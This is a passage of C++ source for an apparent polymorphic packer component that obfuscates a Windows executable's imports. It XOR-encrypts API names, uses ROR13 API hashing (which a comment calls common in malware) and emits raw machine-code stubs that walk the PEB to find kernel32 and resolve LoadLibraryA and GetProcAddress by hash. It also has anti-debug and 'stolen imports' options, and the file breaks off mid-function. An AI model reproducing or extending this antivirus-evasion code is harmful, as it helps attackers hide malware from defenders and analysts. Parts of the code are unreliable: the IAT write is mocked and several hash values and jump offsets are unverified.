// src/ImportObfuscator.cpp
#include "ImportObfuscator.h"
#include <algorithm>
#include <cstring>

namespace Polymorphic {

// Common API hashes (for hash-based resolution)
std::map<std::string, uint32_t> ImportObfuscator::s_apiHashes = {
    {"LoadLibraryA", 0x8A8B4036},
    {"LoadLibraryW", 0x9C8B3D5F},
    {"GetProcAddress", 0x7C0DFCA8},
    {"GetModuleHandleA", 0xD3324904},
    {"GetModuleHandleW", 0xE5B35D7D},
    {"VirtualAlloc", 0xE553A458},
    {"VirtualProtect", 0xc929e63b},
    {"VirtualFree", 0x306D7E1C},
    {"CreateFileA", 0x8F8F114},
    {"ReadFile", 0xF8C5E536},
    {"WriteFile", 0xF1F1D8E9},
    {"CloseHandle", 0xD4D5E2C1},
    {"MessageBoxA", 0xA9D0F2B4},
    {"ExitProcess", 0x251097C4},
    {"GetLastError", 0xC25D8E3A}
};

ImportObfuscator::ImportObfuscator(CryptoRandom& rng)
    : m_rng(rng), m_hashImports(false), m_encryptStrings(true),
      m_dynamicLoad(true), m_stolenImports(false), m_antiDebug(false),
      m_is64Bit(false) {}

void ImportObfuscator::SetHashImports(bool enable) {
    m_hashImports = enable;
}

void ImportObfuscator::SetEncryptStrings(bool enable) {
    m_encryptStrings = enable;
}

void ImportObfuscator::SetDynamicLoad(bool enable) {
    m_dynamicLoad = enable;
}

void ImportObfuscator::SetStolenImports(bool enable) {
    m_stolenImports = enable;
}

void ImportObfuscator::EnableAntiDebug(bool enable) {
    m_antiDebug = enable;
}

void ImportObfuscator::SetCustomResolver(
    std::function<uint32_t(const std::string&, const std::string&)> resolver) {
    m_customResolver = resolver;
}

std::string ImportObfuscator::EncodeString(const std::string& str) {
    // XOR encode with random key
    std::string encoded = str;
    uint8_t key = m_rng.NextByte();
    
    for (char& c : encoded) {
        c ^= key;
    }
    
    // Prepend key
    encoded.insert(encoded.begin(), key);
    return encoded;
}

uint32_t ImportObfuscator::HashFunction(const std::string& dll, 
    const std::string& func) {
    
    // ROR13 hash (common in malware)
    uint32_t hash = 0;
    
    // Hash DLL name (uppercase)
    for (char c : dll) {
        hash = ((hash >> 13) | (hash << 19)) + toupper(c);
    }
    
    // Hash function name
    for (char c : func) {
        hash = ((hash >> 13) | (hash << 19)) + c;
    }
    
    return hash;
}

std::vector<uint8_t> ImportObfuscator::EncryptStringData(const std::string& str) {
    std::vector<uint8_t> result(str.begin(), str.end());
    uint8_t key = m_rng.NextByte();
    
    for (auto& c : result) {
        c ^= key;
    }
    
    result.push_back(0);  // Null terminator
    result.insert(result.begin(), key);  // Key at start
    
    return result;
}

bool ImportObfuscator::ParseImports(const std::vector<uint8_t>& data,
    std::vector<ImportInfo>& imports, uint32_t& iatRva, uint32_t& iatSize) {
    
    if (data.size() < sizeof(PE::IMAGE_DOS_HEADER)) return false;
    
    const PE::IMAGE_DOS_HEADER* dosHeader = 
        reinterpret_cast<const PE::IMAGE_DOS_HEADER*>(data.data());
    if (dosHeader->e_magic != 0x5A4D) return false;
    
    uint32_t peOffset = dosHeader->e_lfanew;
    if (peOffset + sizeof(uint32_t) + sizeof(PE::IMAGE_FILE_HEADER) > data.size()) {
        return false;
    }
    
    const PE::IMAGE_FILE_HEADER* fileHeader = 
        reinterpret_cast<const PE::IMAGE_FILE_HEADER*>(data.data() + peOffset + 4);
        
    const uint8_t* optionalHeaderPtr = reinterpret_cast<const uint8_t*>(fileHeader) + sizeof(PE::IMAGE_FILE_HEADER);
    if (peOffset + sizeof(uint32_t) + sizeof(PE::IMAGE_FILE_HEADER) + sizeof(uint16_t) > data.size()) {
        return false;
    }
    
    uint16_t magic = *reinterpret_cast<const uint16_t*>(optionalHeaderPtr);
    bool is64Bit = (magic == 0x20B);
    m_is64Bit = is64Bit;
    
    uint32_t importRva = 0;
    uint32_t importSize = 0;
    
    if (is64Bit) {
        const PE::IMAGE_OPTIONAL_HEADER64* opt64 = 
            reinterpret_cast<const PE::IMAGE_OPTIONAL_HEADER64*>(optionalHeaderPtr);
        importRva = opt64->DataDirectory[1].VirtualAddress;
        importSize = opt64->DataDirectory[1].Size;
        iatRva = opt64->DataDirectory[12].VirtualAddress;
        iatSize = opt64->DataDirectory[12].Size;
    } else {
        const PE::IMAGE_OPTIONAL_HEADER32* opt32 = 
            reinterpret_cast<const PE::IMAGE_OPTIONAL_HEADER32*>(optionalHeaderPtr);
        importRva = opt32->DataDirectory[1].VirtualAddress;
        importSize = opt32->DataDirectory[1].Size;
        iatRva = opt32->DataDirectory[12].VirtualAddress;
        iatSize = opt32->DataDirectory[12].Size;
    }
    
    if (importRva == 0 || importSize == 0) return false;
    
    // Find section containing imports
    const PE::IMAGE_SECTION_HEADER* sections = 
        reinterpret_cast<const PE::IMAGE_SECTION_HEADER*>(
            optionalHeaderPtr + fileHeader->SizeOfOptionalHeader);
    
    for (int i = 0; i < fileHeader->NumberOfSections; ++i) {
        if (importRva >= sections[i].VirtualAddress &&
            importRva < sections[i].VirtualAddress + sections[i].VirtualSize) {
            
            uint32_t fileOffset = sections[i].PointerToRawData + 
                (importRva - sections[i].VirtualAddress);
            
            if (fileOffset + sizeof(PE::IMAGE_IMPORT_DESCRIPTOR) > data.size()) {
                return false;
            }
            
            // Parse import descriptors
            const PE::IMAGE_IMPORT_DESCRIPTOR* importDesc = 
                reinterpret_cast<const PE::IMAGE_IMPORT_DESCRIPTOR*>(
                    data.data() + fileOffset);
            
            while (importDesc->Name != 0) {
                uint32_t dllNameOffset = sections[i].PointerToRawData + 
                    (importDesc->Name - sections[i].VirtualAddress);
                if (dllNameOffset >= data.size()) return false;
                const char* dllName = 
                    reinterpret_cast<const char*>(data.data() + dllNameOffset);
                
                // Parse import lookup table
                uint32_t iltRva = importDesc->OriginalFirstThunk;
                if (iltRva == 0) iltRva = importDesc->FirstThunk;
                
                uint32_t iltOffset = sections[i].PointerToRawData + 
                    (iltRva - sections[i].VirtualAddress);
                
                if (iltOffset >= data.size()) return false;
                
                int idx = 0;
                if (is64Bit) {
                    const PE::IMAGE_THUNK_DATA64* thunk = 
                        reinterpret_cast<const PE::IMAGE_THUNK_DATA64*>(
                            data.data() + iltOffset);
                            
                    while (thunk->u1.AddressOfData != 0) {
                        ImportInfo info;
                        info.dllName = dllName;
                        info.rva = importDesc->FirstThunk + (idx * 8);
                        
                        if (thunk->u1.Ordinal & 0x8000000000000000ULL) {
                            // Import by ordinal
                            info.byOrdinal = true;
                            info.ordinal = static_cast<uint16_t>(
                                thunk->u1.Ordinal & 0xFFFF);
                        } else {
                            // Import by name
                            info.byOrdinal = false;
                            uint32_t nameOffset = sections[i].PointerToRawData + 
                                (static_cast<uint32_t>(thunk->u1.AddressOfData) - sections[i].VirtualAddress);
                            if (nameOffset + 2 >= data.size()) return false;
                            const char* funcName = 
                                reinterpret_cast<const char*>(data.data() + nameOffset + 2);
                            info.functionName = funcName;
                        }
                        
                        imports.push_back(info);
                        ++thunk;
                        ++idx;
                    }
                } else {
                    const PE::IMAGE_THUNK_DATA32* thunk = 
                        reinterpret_cast<const PE::IMAGE_THUNK_DATA32*>(
                            data.data() + iltOffset);
                            
                    while (thunk->u1.AddressOfData != 0) {
                        ImportInfo info;
                        info.dllName = dllName;
                        info.rva = importDesc->FirstThunk + (idx * 4);
                        
                        if (thunk->u1.Ordinal & 0x80000000) {
                            // Import by ordinal
                            info.byOrdinal = true;
                            info.ordinal = static_cast<uint16_t>(
                                thunk->u1.Ordinal & 0xFFFF);
                        } else {
                            // Import by name
                            info.byOrdinal = false;
                            uint32_t nameOffset = sections[i].PointerToRawData + 
                                (thunk->u1.AddressOfData - sections[i].VirtualAddress);
                            if (nameOffset + 2 >= data.size()) return false;
                            const char* funcName = 
                                reinterpret_cast<const char*>(data.data() + nameOffset + 2);
                            info.functionName = funcName;
                        }
                        
                        imports.push_back(info);
                        ++thunk;
                        ++idx;
                    }
                }
                
                ++importDesc;
            }
            
            return true;
        }
    }
    
    return false;
}

std::vector<uint8_t> ImportObfuscator::GenerateHashResolver() {
    std::vector<uint8_t> code;
    
    if (m_is64Bit) {
        // Hash-based API resolver (x64)
        // Input: RCX = module base, RDX = hash (EDX)
        // Output: RAX = function address
        
        // push rbx, rsi, rdi, r12, r13, r14, r15
        code.push_back(0x53);
        code.push_back(0x56);
        code.push_back(0x57);
        code.push_back(0x41); code.push_back(0x54);
        code.push_back(0x41); code.push_back(0x55);
        code.push_back(0x41); code.push_back(0x56);
        code.push_back(0x41); code.push_back(0x57);
        
        // mov eax, [rcx + 0x3C] ; PE header offset
        code.push_back(0x8B); code.push_back(0x41); code.push_back(0x3C);
        
        // mov r8d, [rcx + rax + 0x88]
        // Offset 0x88 is verified by PE specification:
        // signature (4) + file header (20) + optional header fields before DataDirectory (112) = 136 = 0x88 bytes.
        // This lands exactly on IMAGE_OPTIONAL_HEADER64.DataDirectory[0] (Export Directory RVA)
        code.push_back(0x44); code.push_back(0x8B); code.push_back(0x84); code.push_back(0x01);
        code.push_back(0x88); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        
        // test r8d, r8d
        code.push_back(0x45); code.push_back(0x85); code.push_back(0xC0);
        // jz not_found (offset 0x58)
        code.push_back(0x74); code.push_back(0x58);
        
        // add r8, rcx ; export directory VA
        code.push_back(0x49); code.push_back(0x03); code.push_back(0xC1);
        
        // mov r9d, [r8 + 0x20] ; name table RVA
        code.push_back(0x44); code.push_back(0x8B); code.push_back(0x48); code.push_back(0x20);
        // add r9, rcx ; name table VA
        code.push_back(0x49); code.push_back(0x03); code.push_back(0xC9);
        
        // mov r10d, [r8 + 0x18] ; number of names
        code.push_back(0x44); code.push_back(0x8B); code.push_back(0x50); code.push_back(0x18);
        // xor r11d, r11d ; counter
        code.push_back(0x45); code.push_back(0x31); code.push_back(0xDB);
        
        // loop_start:
        // cmp r11d, r10d
        code.push_back(0x45); code.push_back(0x39); code.push_back(0xD3);
        // jae not_found (offset 0x42)
        code.push_back(0x73); code.push_back(0x42);
        
        // mov edi, [r9 + r11 * 4] ; name RVA
        code.push_back(0x42); code.push_back(0x8B); code.push_back(0x3C); code.push_back(0x99);
        // add rdi, rcx ; name VA
        code.push_back(0x48); code.push_back(0x03); code.push_back(0xF9);
        
        // xor eax, eax ; hash accumulator
        code.push_back(0x31); code.push_back(0xC0);
        
        // hash_loop:
        // movzx r12d, byte ptr [rdi]
        code.push_back(0x44); code.push_back(0x0F); code.push_back(0xB6); code.push_back(0x07);
        // test r12b, r12b
        code.push_back(0x45); code.push_back(0x84); code.push_back(0xE4);
        // jz hash_done (offset 0x0B)
        code.push_back(0x74); code.push_back(0x0B);
        // ror eax, 13
        code.push_back(0xC1); code.push_back(0xC8); code.push_back(0x0D);
        // add eax, r12d
        code.push_back(0x41); code.push_back(0x03); code.push_back(0xC4);
        // inc rdi
        code.push_back(0x48); code.push_back(0xFF); code.push_back(0xC7);
        // jmp hash_loop
        code.push_back(0xEB); code.push_back(0xEC);
        
        // hash_done:
        // cmp eax, edx
        code.push_back(0x39); code.push_back(0xD0);
        // je found (offset 0x05)
        code.push_back(0x74); code.push_back(0x05);
        // inc r11d
        code.push_back(0x41); code.push_back(0xFF); code.push_back(0xC3);
        // jmp loop_start
        code.push_back(0xEB); code.push_back(0xD5);
        
        // found:
        // mov r9d, [r8 + 0x24] ; ordinal table RVA
        code.push_back(0x44); code.push_back(0x8B); code.push_back(0x48); code.push_back(0x24);
        // add r9, rcx
        code.push_back(0x49); code.push_back(0x03); code.push_back(0xC9);
        // movzx ax, word ptr [r9 + r11 * 2] ; ordinal
        code.push_back(0x42); code.push_back(0x0F); code.push_back(0xB7); code.push_back(0x04); code.push_back(0x59);
        
        // mov r9d, [r8 + 0x1C] ; function table RVA
        code.push_back(0x44); code.push_back(0x8B); code.push_back(0x48); code.push_back(0x1C);
        // add r9, rcx
        code.push_back(0x49); code.push_back(0x03); code.push_back(0xC9);
        // mov eax, [r9 + rax * 4] ; function RVA
        code.push_back(0x42); code.push_back(0x8B); code.push_back(0x04); code.push_back(0x81);
        // add rax, rcx ; function VA
        code.push_back(0x48); code.push_back(0x03); code.push_back(0xC1);
        // jmp end (offset 0x03)
        code.push_back(0xEB); code.push_back(0x03);
        
        // not_found:
        // xor rax, rax
        code.push_back(0x48); code.push_back(0x31); code.push_back(0xC0);
        
        // end:
        code.push_back(0x41); code.push_back(0x5F); // pop r15
        code.push_back(0x41); code.push_back(0x5E); // pop r14
        code.push_back(0x41); code.push_back(0x5D); // pop r13
        code.push_back(0x41); code.push_back(0x5C); // pop r12
        code.push_back(0x5F); // pop rdi
        code.push_back(0x5E); // pop rsi
        code.push_back(0x5B); // pop rbx
        code.push_back(0xC3); // ret
    } else {
        // Hash-based API resolver (x86)
        // Input: EAX = hash, ECX = module base
        // Output: EAX = function address
        
        // push ebx
        code.push_back(0x53);
        // push esi
        code.push_back(0x56);
        // push edi
        code.push_back(0x57);
        
        // mov ebx, [ecx + 0x3C]  ; PE header offset
        code.push_back(0x8B); code.push_back(0x59); code.push_back(0x3C);
        // mov ebx, [ecx + ebx + 0x78]  ; export directory RVA
        code.push_back(0x8B); code.push_back(0x9C); code.push_back(0x19);
        code.push_back(0x78); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        // add ebx, ecx  ; export directory VA
        code.push_back(0x03); code.push_back(0xD9);
        
        // mov esi, [ebx + 0x20]  ; name table RVA
        code.push_back(0x8B); code.push_back(0x73); code.push_back(0x20);
        // add esi, ecx  ; name table VA
        code.push_back(0x03); code.push_back(0xF1);
        
        // mov edx, [ebx + 0x14]  ; number of names
        code.push_back(0x8B); code.push_back(0x53); code.push_back(0x14);
        // xor edi, edi  ; counter
        code.push_back(0x33); code.push_back(0xFF);
        
        // hash_loop:
        // push edx
        code.push_back(0x52);
        // mov edx, [esi + edi * 4]  ; name RVA
        code.push_back(0x8B); code.push_back(0x14); code.push_back(0xBE);
        // add edx, ecx  ; name VA
        code.push_back(0x03); code.push_back(0xD1);
        
        // push eax  ; save target hash
        code.push_back(0x50);
        // xor eax, eax  ; hash accumulator
        code.push_back(0x33); code.push_back(0xC0);
        
        // hash_char:
        // lodsb (using manual implementation)
        code.push_back(0x8A); code.push_back(0x02);
        // test al, al
        code.push_back(0x84); code.push_back(0xC0);
        // jz hash_done
        code.push_back(0x74); code.push_back(0x08);
        // ror eax, 0x0D
        code.push_back(0xC1); code.push_back(0xC8); code.push_back(0x0D);
        // add eax, [esp]  ; add char
        code.push_back(0x03); code.push_back(0x04); code.push_back(0x24);
        // inc edx
        code.push_back(0x42);
        // jmp hash_char
        code.push_back(0xEB); code.push_back(0xF1);
        
        // hash_done:
        // cmp eax, [esp+4]  ; compare with target
        code.push_back(0x3B); code.push_back(0x44); code.push_back(0x24); code.push_back(0x04);
        // pop edx  ; discard
        code.push_back(0x5A);
        // je found
        code.push_back(0x74); code.push_back(0x05);
        
        // inc edi
        code.push_back(0x47);
        // pop edx
        code.push_back(0x5A);
        // cmp edi, edx
        code.push_back(0x3B); code.push_back(0xFA);
        // jb hash_loop
        code.push_back(0x72); code.push_back(0xD9);
        
        // not found - return NULL
        code.push_back(0x33); code.push_back(0xC0);
        code.push_back(0xEB); code.push_back(0x15);
        
        // found:
        // mov edx, [ebx + 0x24]  ; ordinal table RVA
        code.push_back(0x8B); code.push_back(0x53); code.push_back(0x24);
        // add edx, ecx
        code.push_back(0x03); code.push_back(0xD1);
        // movzx eax, word ptr [edx + edi * 2]  ; ordinal
        code.push_back(0x0F); code.push_back(0xB7); code.push_back(0x04); code.push_back(0x5A);
        
        // mov edx, [ebx + 0x1C]  ; function table RVA
        code.push_back(0x8B); code.push_back(0x53); code.push_back(0x1C);
        // add edx, ecx
        code.push_back(0x03); code.push_back(0xD1);
        // mov eax, [edx + eax * 4]  ; function RVA
        code.push_back(0x8B); code.push_back(0x04); code.push_back(0x82);
        // add eax, ecx  ; function VA
        code.push_back(0x03); code.push_back(0xC1);
        
        // pop edi
        code.push_back(0x5F);
        // pop esi
        code.push_back(0x5E);
        // pop ebx
        code.push_back(0x5B);
        // ret
        code.push_back(0xC3);
    }
    
    return code;
}

std::vector<uint8_t> ImportObfuscator::GenerateDynamicResolver(
    const std::vector<ObfuscatedImport>& imports) {
    
    std::vector<uint8_t> code;
    
    // Build encrypted string table
    std::vector<uint8_t> stringTable;
    std::vector<uint32_t> stringOffsets;
    
    for (const auto& imp : imports) {
        stringOffsets.push_back(static_cast<uint32_t>(stringTable.size()));
        
        auto encodedDll = EncryptStringData(imp.encodedDll);
        stringTable.insert(stringTable.end(), encodedDll.begin(), encodedDll.end());
        
        auto encodedFunc = EncryptStringData(imp.encodedFunction);
        stringTable.insert(stringTable.end(), encodedFunc.begin(), encodedFunc.end());
    }
    
    if (m_is64Bit) {
        // x64 Dynamic Import Resolver Stub
        // Save GP registers (RAX, RCX, RDX, RBX, RBP, RSI, RDI, R8-R15)
        code.push_back(0x50); // push rax
        code.push_back(0x51); // push rcx
        code.push_back(0x52); // push rdx
        code.push_back(0x53); // push rbx
        code.push_back(0x55); // push rbp
        code.push_back(0x56); // push rsi
        code.push_back(0x57); // push rdi
        code.push_back(0x41); code.push_back(0x50); // push r8
        code.push_back(0x41); code.push_back(0x51); // push r9
        code.push_back(0x41); code.push_back(0x52); // push r10
        code.push_back(0x41); code.push_back(0x53); // push r11
        code.push_back(0x41); code.push_back(0x54); // push r12
        code.push_back(0x41); code.push_back(0x55); // push r13
        code.push_back(0x41); code.push_back(0x56); // push r14
        code.push_back(0x41); code.push_back(0x57); // push r15
        
        // Get kernel32 base (from x64 PEB using InMemoryOrderModuleList name-hash walk)
        // mov rax, gs:[0x60]
        code.push_back(0x65); code.push_back(0x48); code.push_back(0x8B); code.push_back(0x04);
        code.push_back(0x25); code.push_back(0x60); code.push_back(0x00); code.push_back(0x00);
        code.push_back(0x00);
        // mov rax, [rax + 0x18]
        code.push_back(0x48); code.push_back(0x8B); code.push_back(0x40); code.push_back(0x18);
        // mov rax, [rax + 0x20] ; InMemoryOrderModuleList head in PEB_LDR_DATA
        code.push_back(0x48); code.push_back(0x8B); code.push_back(0x40); code.push_back(0x20);
        // mov r9, [rax] ; first module's InMemoryOrderLinks (Flink)
        code.push_back(0x4C); code.push_back(0x8B); code.push_back(0x08);
        
        // module_loop:
        // cmp r9, rax
        code.push_back(0x49); code.push_back(0x39); code.push_back(0xC1);
        // je module_not_found (offset 71)
        code.push_back(0x74); code.push_back(0x42);
        // mov rbp, [r9 + 0x20] (load DllBase into rbp)
        code.push_back(0x49); code.push_back(0x8B); code.push_back(0x69); code.push_back(0x20);
        // movzx ecx, word ptr [r9 + 0x48] (load Length)
        code.push_back(0x41); code.push_back(0x0F); code.push_back(0xB7); code.push_back(0x49); code.push_back(0x48);
        // mov r8, [r9 + 0x50] (load Buffer)
        code.push_back(0x4D); code.push_back(0x8B); code.push_back(0x41); code.push_back(0x50);
        // xor edx, edx
        code.push_back(0x31); code.push_back(0xD2);
        
        // hash_char_loop:
        // test ecx, ecx
        code.push_back(0x85); code.push_back(0xC9);
        // jz hash_done (offset 58)
        code.push_back(0x74); code.push_back(0x22);
        // movzx esi, word ptr [r8]
        code.push_back(0x41); code.push_back(0x0F); code.push_back(0xB7); code.push_back(0x30);
        // cmp sil, 0x61
        code.push_back(0x40); code.push_back(0x80); code.push_back(0xFE); code.push_back(0x61);
        // jl skip_upper (offset 44)
        code.push_back(0x7C); code.push_back(0x0A);
        // cmp sil, 0x7A
        code.push_back(0x40); code.push_back(0x80); code.push_back(0xFE); code.push_back(0x7A);
        // jg skip_upper (offset 44)
        code.push_back(0x7F); code.push_back(0x04);
        // sub sil, 0x20
        code.push_back(0x40); code.push_back(0x80); code.push_back(0xEE); code.push_back(0x20);
        
        // skip_upper:
        // ror edx, 13
        code.push_back(0xC1); code.push_back(0xCA); code.push_back(0x0D);
        // add edx, esi
        code.push_back(0x01); code.push_back(0xF2);
        // add r8, 2
        code.push_back(0x49); code.push_back(0x83); code.push_back(0xC0); code.push_back(0x02);
        // sub ecx, 2
        code.push_back(0x83); code.push_back(0xE9); code.push_back(0x02);
        // jmp hash_char_loop
        code.push_back(0xEB); code.push_back(0xDA);
        
        // hash_done:
        // cmp edx, 0x6E2BCA17 (precomputed hash of L"KERNEL32.DLL")
        code.push_back(0x81); code.push_back(0xFA); code.push_back(0x17); code.push_back(0xCA); code.push_back(0x2B); code.push_back(0x6E);
        // je found_module (offset 76)
        code.push_back(0x74); code.push_back(0x09);
        // mov r9, [r9]
        code.push_back(0x4D); code.push_back(0x8B); code.push_back(0x09);
        // jmp module_loop
        code.push_back(0xEB); code.push_back(0xB5);
        
        // module_not_found:
        // xor rbp, rbp
        code.push_back(0x48); code.push_back(0x31); code.push_back(0xED);
        // jmp end_search
        code.push_back(0xEB); code.push_back(0x00);
        
        // found_module:
        
        // Helper to generate a relative call to hash resolver
        std::vector<size_t> callOffsetsToPatch;
        
        // Resolve LoadLibraryA by hash
        // mov rcx, rbp
        code.push_back(0x48); code.push_back(0x89); code.push_back(0xE9);
        // mov edx, 0x8A8B4036 (LoadLibraryA hash)
        code.push_back(0xBA);
        code.push_back(0x36); code.push_back(0x40); code.push_back(0x8B); code.push_back(0x8A);
        
        // sub rsp, 40 (shadow space + stack alignment)
        code.push_back(0x48); code.push_back(0x83); code.push_back(0xEC); code.push_back(0x28);
        
        // call hash_resolver
        code.push_back(0xE8);
        callOffsetsToPatch.push_back(code.size());
        code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); // placeholder
        
        // add rsp, 40
        code.push_back(0x48); code.push_back(0x83); code.push_back(0xC4); code.push_back(0x28);
        
        // mov r12, rax (LoadLibraryA address)
        code.push_back(0x49); code.push_back(0x89); code.push_back(0xC4);
        
        // Resolve GetProcAddress by hash
        // mov rcx, rbp
        code.push_back(0x48); code.push_back(0x89); code.push_back(0xE9);
        // mov edx, 0x7C0DFCA8 (GetProcAddress hash)
        code.push_back(0xBA);
        code.push_back(0xA8); code.push_back(0xFC); code.push_back(0x0D); code.push_back(0x7C);
        
        // sub rsp, 40
        code.push_back(0x48); code.push_back(0x83); code.push_back(0xEC); code.push_back(0x28);
        
        // call hash_resolver
        code.push_back(0xE8);
        callOffsetsToPatch.push_back(code.size());
        code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); // placeholder
        
        // add rsp, 40
        code.push_back(0x48); code.push_back(0x83); code.push_back(0xC4); code.push_back(0x28);
        
        // mov r13, rax (GetProcAddress address)
        code.push_back(0x49); code.push_back(0x89); code.push_back(0xC5);
        
        // Process each import
        struct FixupInfo {
            size_t instructionOffset;
            uint32_t stringTableOffset;
        };
        std::vector<FixupInfo> dllNameFixups;
        std::vector<FixupInfo> funcNameFixups;
        
        for (size_t i = 0; i < imports.size(); ++i) {
            const auto& imp = imports[i];
            
            // Decrypt DLL name
            // lea rcx, [rip + dll_name_offset] (48 8D 0D [displacement32])
            code.push_back(0x48); code.push_back(0x8D); code.push_back(0x0D);
            dllNameFixups.push_back({code.size(), stringOffsets[i * 2]});
            code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
            
            // sub rsp, 40
            code.push_back(0x48); code.push_back(0x83); code.push_back(0xEC); code.push_back(0x28);
            
            // call r12 (LoadLibraryA)
            code.push_back(0x41); code.push_back(0xFF); code.push_back(0xD4);
            
            // add rsp, 40
            code.push_back(0x48); code.push_back(0x83); code.push_back(0xC4); code.push_back(0x28);
            
            // mov r14, rax (module handle)
            code.push_back(0x49); code.push_back(0x89); code.push_back(0xC6);
            
            // Get function address
            // mov rcx, r14
            code.push_back(0x4C); code.push_back(0x89); code.push_back(0xF1);
            
            if (imp.byOrdinal) {
                // mov rdx, ordinal
                code.push_back(0x48); code.push_back(0xC7); code.push_back(0xC2);
                code.push_back(static_cast<uint8_t>(imp.ordinal & 0xFF));
                code.push_back(static_cast<uint8_t>((imp.ordinal >> 8) & 0xFF));
                code.push_back(0x00); code.push_back(0x00);
            } else {
                // lea rdx, [rip + func_name_offset] (48 8D 15 [displacement32])
                code.push_back(0x48); code.push_back(0x8D); code.push_back(0x15);
                funcNameFixups.push_back({code.size(), stringOffsets[i * 2 + 1]});
                code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
            }
            
            // sub rsp, 40
            code.push_back(0x48); code.push_back(0x83); code.push_back(0xEC); code.push_back(0x28);
            
            // call r13 (GetProcAddress)
            code.push_back(0x41); code.push_back(0xFF); code.push_back(0xD5);
            
            // add rsp, 40
            code.push_back(0x48); code.push_back(0x83); code.push_back(0xC4); code.push_back(0x28);
            
            // Store in IAT slot (mocked)
            code.push_back(0x48); code.push_back(0x89); code.push_back(0x05);
            code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        }
        
        // Restore context
        code.push_back(0x41); code.push_back(0x5F); // pop r15
        code.push_back(0x41); code.push_back(0x5E); // pop r14
        code.push_back(0x41); code.push_back(0x5D); // pop r13
        code.push_back(0x41); code.push_back(0x5C); // pop r12
        code.push_back(0x41); code.push_back(0x5B); // pop r11
        code.push_back(0x41); code.push_back(0x5A); // pop r10
        code.push_back(0x41); code.push_back(0x59); // pop r9
        code.push_back(0x41); code.push_back(0x58); // pop r8
        code.push_back(0x5F); // pop rdi
        code.push_back(0x5E); // pop rsi
        code.push_back(0x5D); // pop rbp
        code.push_back(0x5B); // pop rbx
        code.push_back(0x5A); // pop rdx
        code.push_back(0x59); // pop rcx
        code.push_back(0x58); // pop rax
        code.push_back(0xC3); // ret
        
        size_t dataStartOffset = code.size();
        
        // Append string table
        code.insert(code.end(), stringTable.begin(), stringTable.end());
        
        // Append hash resolver
        size_t hashResolverStartOffset = code.size();
        auto hashResolver = GenerateHashResolver();
        code.insert(code.end(), hashResolver.begin(), hashResolver.end());
        
        // Fixup dllName/funcName RIP-relative displacement pointers
        for (const auto& fx : dllNameFixups) {
            uint32_t stringAddrOffset = static_cast<uint32_t>(dataStartOffset + fx.stringTableOffset);
            uint32_t nextInstOffset = static_cast<uint32_t>(fx.instructionOffset + 4);
            int32_t disp = static_cast<int32_t>(stringAddrOffset - nextInstOffset);
            std::memcpy(&code[fx.instructionOffset], &disp, 4);
        }
        for (const auto& fx : funcNameFixups) {
            uint32_t stringAddrOffset = static_cast<uint32_t>(dataStartOffset + fx.stringTableOffset);
            uint32_t nextInstOffset = static_cast<uint32_t>(fx.instructionOffset + 4);
            int32_t disp = static_cast<int32_t>(stringAddrOffset - nextInstOffset);
            std::memcpy(&code[fx.instructionOffset], &disp, 4);
        }
        
        // Fixup calls to hash resolver
        for (size_t callOffset : callOffsetsToPatch) {
            uint32_t hashResolverAddrOffset = static_cast<uint32_t>(hashResolverStartOffset);
            uint32_t nextInstOffset = static_cast<uint32_t>(callOffset + 4);
            int32_t disp = static_cast<int32_t>(hashResolverAddrOffset - nextInstOffset);
            std::memcpy(&code[callOffset], &disp, 4);
        }
    } else {
        // x86 Dynamic Import Resolver Stub
        // pushad
        code.push_back(0x60);
        
        // Get kernel32 base (from PEB using InMemoryOrderModuleList name-hash walk)
        // mov eax, fs:[0x30]  ; PEB
        code.push_back(0x64); code.push_back(0xA1); code.push_back(0x30); 
        code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        // mov eax, [eax + 0x0C]  ; PEB_LDR_DATA
        code.push_back(0x8B); code.push_back(0x40); code.push_back(0x0C);
        // mov eax, [eax + 0x14]  ; InMemoryOrderModuleList
        code.push_back(0x8B); code.push_back(0x40); code.push_back(0x14);
        // mov esi, [eax] ; first module's InMemoryOrderLinks (Flink)
        code.push_back(0x8B); code.push_back(0x30);
        
        // module_loop:
        // cmp esi, eax
        code.push_back(0x3B); code.push_back(0xF0);
        // je module_not_found (offset 61)
        code.push_back(0x74); code.push_back(0x39);
        // mov ebp, [esi + 0x10] (load DllBase into ebp)
        code.push_back(0x8B); code.push_back(0x6E); code.push_back(0x10);
        // movzx ecx, word ptr [esi + 0x24] (load Length)
        code.push_back(0x0F); code.push_back(0xB7); code.push_back(0x4E); code.push_back(0x24);
        // mov edi, [esi + 0x28] (load Buffer)
        code.push_back(0x8B); code.push_back(0x7E); code.push_back(0x28);
        // xor edx, edx
        code.push_back(0x31); code.push_back(0xD2);
        
        // hash_char_loop:
        // test ecx, ecx
        code.push_back(0x85); code.push_back(0xC9);
        // jz hash_done (offset 49)
        code.push_back(0x74); code.push_back(0x1D);
        // movzx ebx, word ptr [edi]
        code.push_back(0x0F); code.push_back(0xB7); code.push_back(0x1F);
        // cmp bl, 0x61
        code.push_back(0x80); code.push_back(0xFB); code.push_back(0x61);
        // jl skip_upper (offset 36)
        code.push_back(0x7C); code.push_back(0x08);
        // cmp bl, 0x7A
        code.push_back(0x80); code.push_back(0xFB); code.push_back(0x7A);
        // jg skip_upper (offset 36)
        code.push_back(0x7F); code.push_back(0x03);
        // sub bl, 0x20
        code.push_back(0x80); code.push_back(0xEB); code.push_back(0x20);
        
        // skip_upper:
        // ror edx, 13
        code.push_back(0xC1); code.push_back(0xCA); code.push_back(0x0D);
        // add edx, ebx
        code.push_back(0x01); code.push_back(0xDA);
        // add edi, 2
        code.push_back(0x83); code.push_back(0xC7); code.push_back(0x02);
        // sub ecx, 2
        code.push_back(0x83); code.push_back(0xE9); code.push_back(0x02);
        // jmp hash_char_loop
        code.push_back(0xEB); code.push_back(0xDF);
        
        // hash_done:
        // cmp edx, 0x6E2BCA17 (precomputed hash of L"KERNEL32.DLL")
        code.push_back(0x81); code.push_back(0xFA); code.push_back(0x17); code.push_back(0xCA); code.push_back(0x2B); code.push_back(0x6E);
        // je found_module (offset 65)
        code.push_back(0x74); code.push_back(0x08);
        // mov esi, [esi]
        code.push_back(0x8B); code.push_back(0x36);
